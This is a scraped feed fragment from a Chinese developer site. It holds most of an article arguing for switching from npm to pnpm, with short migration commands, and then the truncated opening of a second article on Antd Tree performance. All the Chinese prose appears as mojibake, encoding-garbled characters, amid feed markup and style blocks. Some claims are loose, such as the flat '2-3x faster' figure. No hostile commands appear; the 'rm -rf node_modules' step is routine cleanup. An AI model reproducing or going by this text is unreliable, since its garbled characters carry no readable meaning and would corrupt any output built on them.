                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ§‘â€ğŸ’» <strong>npm vs pnpmï¼šä¸ºä»€ä¹ˆä» npm åˆ‡æ¢åˆ° pnpmï¼Ÿ</strong></h2>
<h3 data-id="heading-1">1. <strong>pnpm æä¾›æ›´å¿«çš„å®‰è£…é€Ÿåº¦</strong></h3>
<h4 data-id="heading-2">ä¼ ç»Ÿ npm å®‰è£…åŒ…çš„æ–¹å¼ï¼š</h4>
<ul>
<li><code>npm</code> åœ¨æ¯ä¸ªé¡¹ç›®ä¸­éƒ½ä¼šå•ç‹¬ä¸‹è½½å¹¶å®‰è£…ä¾èµ–ï¼Œæ¯ä¸ªä¾èµ–éƒ½ä¼šæœ‰ä¸€ä¸ªå®Œæ•´çš„å‰¯æœ¬ï¼Œè¿™ä¼šé€ æˆå¾ˆå¤šé‡å¤çš„å®‰è£…ã€‚</li>
</ul>
<h4 data-id="heading-3">pnpm çš„ä¼˜åŠ¿ï¼š</h4>
<ul>
<li><strong>pnpm ä½¿ç”¨å…¨å±€å­˜å‚¨</strong>ï¼šå®ƒå°†æ‰€æœ‰ä¾èµ–åŒ…å­˜åœ¨ä¸€ä¸ªå…¨å±€ç›®å½•ä¸­ï¼ˆé€šå¸¸æ˜¯ <code>~/.pnpm-store</code>ï¼‰ï¼Œç„¶åé€šè¿‡ç¡¬é“¾æ¥ï¼ˆhard linkï¼‰å°†è¿™äº›ä¾èµ–è¿æ¥åˆ°ä½ é¡¹ç›®çš„ <code>node_modules</code> ä¸­ã€‚è¿™æ ·å°±é¿å…äº†é‡å¤çš„ä¾èµ–ä¸‹è½½å’Œå­˜å‚¨ã€‚</li>
</ul>
<p><strong>ç»“æœï¼š</strong></p>
<ul>
<li>å®‰è£…ä¾èµ–é€Ÿåº¦æ›´å¿«ï¼ŒèŠ‚çœç£ç›˜ç©ºé—´ã€‚</li>
<li>åŒæ ·çš„ä¾èµ–åªä¼šä¸‹è½½ä¸€æ¬¡ï¼Œå¤šä¸ªé¡¹ç›®é—´å…±äº«ç›¸åŒçš„ä¾èµ–ã€‚</li>
</ul>
<blockquote>
<p><strong>å®é™…æ•ˆæœï¼š</strong> åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œ<strong>pnpm çš„å®‰è£…é€Ÿåº¦æ¯” npm å¿« 2-3 å€</strong>ï¼Œå°¤å…¶æ˜¯å¤šä¸ªé¡¹ç›®ä½¿ç”¨ç›¸åŒä¾èµ–æ—¶ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">2. <strong>æ›´é«˜æ•ˆçš„ç£ç›˜ç©ºé—´ä½¿ç”¨</strong></h3>
<h4 data-id="heading-5">npm çš„ç£ç›˜é—®é¢˜ï¼š</h4>
<ul>
<li>ä½¿ç”¨ <code>npm</code> å®‰è£…ä¾èµ–æ—¶ï¼Œæ¯ä¸ªé¡¹ç›®çš„ <code>node_modules</code> ä¸­éƒ½ä¼šæœ‰å®Œæ•´çš„åŒ…å‰¯æœ¬ï¼Œç”šè‡³æ˜¯å¤šä¸ªç‰ˆæœ¬çš„åŒ…ã€‚è¿™å¯¹äºå¤§é¡¹ç›®æˆ–å¤šä¸ªé¡¹ç›®è€Œè¨€ï¼Œå ç”¨çš„ç£ç›˜ç©ºé—´éå¸¸å·¨å¤§ã€‚</li>
</ul>
<h4 data-id="heading-6">pnpm çš„ç£ç›˜ä¼˜åŒ–ï¼š</h4>
<ul>
<li><code>pnpm</code> é‡‡ç”¨ <strong>ç¡¬é“¾æ¥</strong> çš„æ–¹å¼ï¼Œæ‰€æœ‰çš„åŒ…éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€ç›®å½•ä¸­ï¼Œè€Œé¡¹ç›®åªä¿å­˜é“¾æ¥ã€‚è¿™æ ·ï¼Œå¤šä¸ªé¡¹ç›®å¯ä»¥å…±äº«ç›¸åŒçš„åŒ…å‰¯æœ¬ï¼Œé¿å…é‡å¤å­˜å‚¨ï¼Œæé«˜ç£ç›˜ç©ºé—´åˆ©ç”¨ç‡ã€‚</li>
</ul>
<p><strong>ç»“æœï¼š</strong></p>
<ul>
<li>èŠ‚çœäº†å¤§é‡çš„ç£ç›˜ç©ºé—´ï¼Œå°¤å…¶æ˜¯åœ¨å¤šé¡¹ç›®å¼€å‘æ—¶ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-7">3. <strong>ä¸¥æ ¼çš„ä¾èµ–ç®¡ç†</strong></h3>
<h4 data-id="heading-8">npm çš„ä¾èµ–ç®¡ç†é—®é¢˜ï¼š</h4>
<ul>
<li><code>npm</code> å…è®¸ç›´æ¥åœ¨ <code>node_modules</code> ä¸­å®‰è£…æœªåœ¨ <code>package.json</code> ä¸­å£°æ˜çš„ä¾èµ–ï¼ˆæ‰€è°“çš„ "hoisting"ï¼‰ï¼Œè¿™ä¼šå¯¼è‡´é¡¹ç›®ä¸­å‡ºç°éšå¼ä¾èµ–ï¼Œå¯èƒ½åœ¨å¼€å‘æ—¶çœ‹ä¸å‡ºæ¥ï¼Œä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¯èƒ½ä¼šå¼•å‘é—®é¢˜ã€‚</li>
</ul>
<h4 data-id="heading-9">pnpm çš„ä¾èµ–ç®¡ç†ä¼˜åŠ¿ï¼š</h4>
<ul>
<li><code>pnpm</code> å¼ºåˆ¶ <strong>ä¸¥æ ¼çš„æ¨¡å—è§£æ</strong>ï¼Œå®ƒä¼šå°†ä¾èµ–å®‰è£…åœ¨é¡¹ç›®çš„ <code>node_modules/.pnpm</code> ä¸­ï¼Œå¹¶ä¸”åªä¼šé“¾æ¥é¡¹ç›®ä¸­æ˜¾å¼å£°æ˜çš„ä¾èµ–ã€‚è¿™å¯ä»¥é¿å…ä¸å¿…è¦çš„éšå¼ä¾èµ–é—®é¢˜ã€‚</li>
</ul>
<p><strong>ç»“æœï¼š</strong></p>
<ul>
<li>ä¾èµ–å…³ç³»æ›´æ¸…æ™°ï¼Œé¿å…â€œæ¶æ„â€éšå¼ä¾èµ–ã€‚</li>
<li>é€‚ç”¨äºå¤§è§„æ¨¡é¡¹ç›®ï¼Œå¯ä»¥æ›´å¥½åœ°æ§åˆ¶ä¾èµ–ç‰ˆæœ¬ï¼Œé¿å…æ„å¤–å†²çªã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">4. <strong>æå‡çš„å·¥ä½œæµå’Œ CI/CD æ€§èƒ½</strong></h3>
<h4 data-id="heading-11">ä¼ ç»Ÿçš„ npm åœ¨ CI/CD ä¸­çš„åŠ£åŠ¿ï¼š</h4>
<ul>
<li>åœ¨æŒç»­é›†æˆï¼ˆCIï¼‰å’ŒæŒç»­äº¤ä»˜ï¼ˆCDï¼‰è¿‡ç¨‹ä¸­ï¼Œ<code>npm</code> ä¼šé‡æ–°å®‰è£…æ‰€æœ‰ä¾èµ–ï¼Œè¿™ä¼šæ¶ˆè€—å¤§é‡æ—¶é—´ï¼Œå°¤å…¶æ˜¯å½“ä¾èµ–éå¸¸å¤šæ—¶ã€‚</li>
</ul>
<h4 data-id="heading-12">pnpm çš„ä¼˜åŠ¿ï¼š</h4>
<ul>
<li><code>pnpm</code> çš„ <strong>å…¨å±€å­˜å‚¨å’Œç¼“å­˜</strong> æœºåˆ¶ä½¿å¾— CI/CD æµç¨‹æ›´åŠ é«˜æ•ˆã€‚å®ƒå¯ä»¥å¿«é€Ÿæ‰¾åˆ°å¹¶å¤ç”¨å·²å®‰è£…çš„ä¾èµ–ï¼Œå‡å°‘é‡å¤ä¸‹è½½å’Œå®‰è£…ï¼Œä»è€Œæ˜¾è‘—ç¼©çŸ­ CI/CD æµç¨‹æ—¶é—´ã€‚</li>
</ul>
<p><strong>ç»“æœï¼š</strong></p>
<ul>
<li>æ›´å¿«çš„æŒç»­é›†æˆå’Œäº¤ä»˜ã€‚</li>
<li>ç¼©çŸ­éƒ¨ç½²æ—¶é—´ï¼Œæå‡å¼€å‘å’Œéƒ¨ç½²æ•ˆç‡ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-13">5. <strong>è‡ªåŠ¨ç®¡ç†é”æ–‡ä»¶</strong></h3>
<h4 data-id="heading-14">npm é”æ–‡ä»¶çš„é—®é¢˜ï¼š</h4>
<ul>
<li>åœ¨æ—©æœŸç‰ˆæœ¬çš„ npm ä¸­ï¼Œ<code>package-lock.json</code> å­˜åœ¨ä¸åŒçš„ <strong>npm ç‰ˆæœ¬ä¹‹é—´çš„å…¼å®¹æ€§é—®é¢˜</strong>ï¼Œå¯¼è‡´ç›¸åŒçš„ä¾èµ–ç‰ˆæœ¬åœ¨ä¸åŒæœºå™¨ä¸Šå¯èƒ½ä¼šæœ‰ä¸åŒçš„è§£æç»“æœã€‚</li>
</ul>
<h4 data-id="heading-15">pnpm çš„ä¼˜åŠ¿ï¼š</h4>
<ul>
<li><code>pnpm</code> çš„ <strong>lockfile</strong> é€šè¿‡ <code>pnpm-lock.yaml</code> å®Œå…¨è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œç¡®ä¿æ— è®ºåœ¨å“ªå°æœºå™¨ä¸Šå®‰è£…ï¼Œä¾èµ–è§£æéƒ½æ˜¯ä¸€è‡´çš„ï¼Œå¹¶ä¸” <strong>ä¼˜åŒ–äº†å¤šä¸ªç‰ˆæœ¬çš„æ”¯æŒ</strong>ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-16">6. <strong>æ”¯æŒ monorepo é¡¹ç›®</strong></h3>
<h4 data-id="heading-17">npm çš„ monorepo æ”¯æŒä¸è¶³ï¼š</h4>
<ul>
<li>è™½ç„¶ <code>npm</code> æœ€è¿‘å¼€å§‹æä¾›ä¸€äº› monorepo çš„æ”¯æŒï¼ˆé€šè¿‡ <code>npm workspaces</code>ï¼‰ï¼Œä½†å®ƒçš„æ”¯æŒä»ç„¶ä¸å¦‚ <code>pnpm</code> å®Œå–„ã€‚</li>
</ul>
<h4 data-id="heading-18">pnpm çš„ monorepo æ”¯æŒï¼š</h4>
<ul>
<li><code>pnpm</code> å¤©ç”Ÿæ”¯æŒ monorepoï¼ˆå¤šä»“åº“ç®¡ç†ï¼‰ï¼Œæä¾› <strong>æ›´å¿«é€Ÿçš„å·¥ä½œç©ºé—´ï¼ˆworkspacesï¼‰æ”¯æŒ</strong>ï¼Œå…è®¸ä½ è½»æ¾ç®¡ç†å¤šä¸ªå­é¡¹ç›®ï¼Œä¸”ä¸ä¼šåœ¨ç£ç›˜ä¸Šå ç”¨è¿‡å¤šç©ºé—´ã€‚</li>
</ul>
<p><strong>ç»“æœï¼š</strong></p>
<ul>
<li>å¦‚æœä½ çš„é¡¹ç›®æ˜¯ <strong>monorepo é¡¹ç›®</strong>ï¼Œä½¿ç”¨ <code>pnpm</code> ä¼šæ˜¾å¾—æ›´åŠ é«˜æ•ˆå’Œç®€æ´ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-19">ğŸ“ˆ <strong>æ€»ç»“ï¼špnpm çš„ä¼˜åŠ¿</strong></h2>
<ol>
<li><strong>æ›´å¿«çš„ä¾èµ–å®‰è£…é€Ÿåº¦</strong>ï¼šå› ä¸º pnpm ä½¿ç”¨å…¨å±€å­˜å‚¨å’Œç¡¬é“¾æ¥ï¼Œé¿å…äº†é‡å¤ä¸‹è½½ï¼ŒèŠ‚çœæ—¶é—´å’Œç©ºé—´ã€‚</li>
<li><strong>æ›´ä½çš„ç£ç›˜å ç”¨</strong>ï¼šå¤šä¸ªé¡¹ç›®å…±äº«ä¾èµ–ï¼Œé¿å…äº†å†—ä½™çš„åŒ…å­˜å‚¨ã€‚</li>
<li><strong>æ›´ä¸¥æ ¼çš„ä¾èµ–ç®¡ç†</strong>ï¼šå‡å°‘éšå¼ä¾èµ–çš„é£é™©ï¼Œç¡®ä¿ä¾èµ–å…³ç³»æ›´åŠ æ¸…æ™°ã€‚</li>
<li><strong>æ›´é«˜æ•ˆçš„ CI/CD æ€§èƒ½</strong>ï¼šåŠ é€ŸæŒç»­é›†æˆå’Œéƒ¨ç½²æµç¨‹ï¼Œé¿å…é‡å¤å®‰è£…ã€‚</li>
<li><strong>æ›´å¥½åœ°æ”¯æŒ monorepo</strong>ï¼šéå¸¸é€‚åˆå¤šé¡¹ç›®ä»“åº“ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-20">ğŸš€ <strong>æ˜¯å¦å€¼å¾—åˆ‡æ¢åˆ° pnpmï¼Ÿ</strong></h2>
<p>å¦‚æœä½ æ­£åœ¨å¼€å‘ä¸€ä¸ª <strong>ä¸­åˆ°å¤§å‹çš„ Vue3ã€React æˆ–å…¶ä»–å‰ç«¯é¡¹ç›®</strong>ï¼Œæˆ–è€…ä½ çš„é¡¹ç›®æ˜¯ <strong>monorepo</strong>ï¼Œæˆ‘å¼ºçƒˆå»ºè®®ä½ åˆ‡æ¢åˆ° <strong>pnpm</strong>ï¼Œä½ å°†ä½“éªŒåˆ°ï¼š</p>
<ul>
<li>æ›´å¿«çš„ä¾èµ–å®‰è£…</li>
<li>æ›´æ¸…æ™°çš„ä¾èµ–ç®¡ç†</li>
<li>æ›´é«˜æ•ˆçš„ CI/CD æµç¨‹</li>
</ul>
<p>åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œå¦‚æœé¡¹ç›®è§„æ¨¡é€æ¸å¢å¤§ï¼Œ<code>pnpm</code> çš„ä¼˜åŠ¿ä¼šæ›´åŠ æ˜æ˜¾ã€‚</p>
<hr/>
<h4 data-id="heading-21">ğŸ¯ <strong>å¦‚ä½•åˆ‡æ¢åˆ° pnpmï¼Ÿ</strong></h4>
<p>å¦‚æœä½ å†³å®šåˆ‡æ¢åˆ° <code>pnpm</code>ï¼Œåªéœ€è¦ï¼š</p>
<ol>
<li>
<p><strong>å®‰è£… pnpm</strong>ï¼š</p>
<pre><code class="hljs">npm install -g pnpm
</code></pre>
</li>
<li>
<p><strong>åˆ é™¤åŸæœ‰çš„ <code>node_modules</code> å’Œ <code>package-lock.json</code></strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span> -rf node_modules package-lock.json
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨ pnpm å®‰è£…ä¾èµ–</strong>ï¼š</p>
<pre><code class="hljs">pnpm install
</code></pre>
</li>
</ol>
<p>å°±è¿™ä¹ˆç®€å•ï¼ä¹‹åä½ å°±å¯ä»¥ä½¿ç”¨ <code>pnpm run dev</code> æ¥å¯åŠ¨å¼€å‘ç¯å¢ƒäº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Antd Treeç»„ä»¶å®šåˆ¶åŒ–æ€§èƒ½æå‡å®è·µ]]></title>    <link>https://juejin.cn/post/7582267229841686528</link>    <guid>https://juejin.cn/post/7582267229841686528</guid>    <pubDate>2025-12-11T07:51:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582267229841686528" data-draft-id="7581385235965165602" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Antd Treeç»„ä»¶å®šåˆ¶åŒ–æ€§èƒ½æå‡å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-11T07:51:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç™½é¾™é©¬äº‘è¡ŒæŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/2021380681374507"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Antd Treeç»„ä»¶å®šåˆ¶åŒ–æ€§èƒ½æå‡å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2021380681374507/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç™½é¾™é©¬äº‘è¡ŒæŠ€æœ¯å›¢é˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:51:12.000Z" title="Thu Dec 11 2025 07:51:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>ä¸€ã€å‰è¨€</strong></h2>
<h3 data-id="heading-1">1.1 æŠ€æœ¯èƒŒæ™¯ä¸å‘å±•ç°çŠ¶</h3>
<ul>
<li>
<p><strong>æŠ€æœ¯æ ˆ</strong>ï¼šReact 18 + TypeScript + antd 5.6.3ï¼ˆç‰ˆæœ¬é”å®šï¼Œé¿å…å›å½’ï¼‰</p>
</li>
<li>
<p><strong>ä¸šåŠ¡è§„æ¨¡</strong>ï¼šå•åº“ç›®å½•èŠ‚ç‚¹çº¦ 7 k+ï¼Œç›®å½•å±‚çº§æœ€æ·± 10 çº§</p>
</li>
<li>
<p><strong>æ ¸å¿ƒè¯‰æ±‚</strong>ï¼š</p>
<ul>
<li>
<p>ç¡®ä¿æ“ä½œæµç•…ï¼Œé¿å…å¡é¡¿æˆ–å´©æºƒ</p>
</li>
<li>
<p>èŠ‚ç‚¹æ‹–æ‹½å®æ—¶è½åº“</p>
</li>
<li>
<p>å¢åˆ æ”¹æŸ¥ + å…¨æ–‡æœç´¢é«˜äº®</p>
</li>
<li>
<p>ä¿æŒ antd åŸç”Ÿäº¤äº’ï¼Œæ— éœ€å‡çº§ç‰ˆæœ¬æˆ–å¼•å…¥é¢å¤–è¾…åŠ©æ’ä»¶</p>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-2">1.2 æœ¬æ–‡ç›®æ ‡ä¸æ ¸å¿ƒå†…å®¹</h3>
<p>åˆ†äº«â€œä½ç‰ˆæœ¬ antd Treeâ€åœ¨çœŸå®åœºæ™¯ä¸‹å¦‚ä½•è¡¥é½è™šæ‹Ÿæ»šåŠ¨ã€æ‹–æ‹½ã€æœç´¢é«˜äº®ã€Popconfirm è¡¨å•ç­‰èƒ½åŠ›ï¼Œç»™å‡ºå¯å¤åˆ¶çš„å®Œæ•´ä»£ç ä¸æ€§èƒ½æ•°æ®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2189c6f94d5f41b6bc954215cc09da9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m96b6Z6ams5LqR6KGM5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766044272&amp;x-signature=2r%2FFiq%2FYJrT6ggF%2BhL3KhuB3lzs%3D" alt="image.png" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03edd42bd6974910b4cdef268f7847da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m96b6Z6ams5LqR6KGM5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766044272&amp;x-signature=BukQYR%2Be53lo5ZZqP4Cm%2F3Yi3ak%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">äºŒã€æ ¸å¿ƒåŠŸèƒ½æ¦‚è§ˆä¸è®¾è®¡</h2>
<h3 data-id="heading-4">2.1 ç³»ç»Ÿæ¶æ„ä¸æ¨¡å—åˆ’åˆ†</h3>






























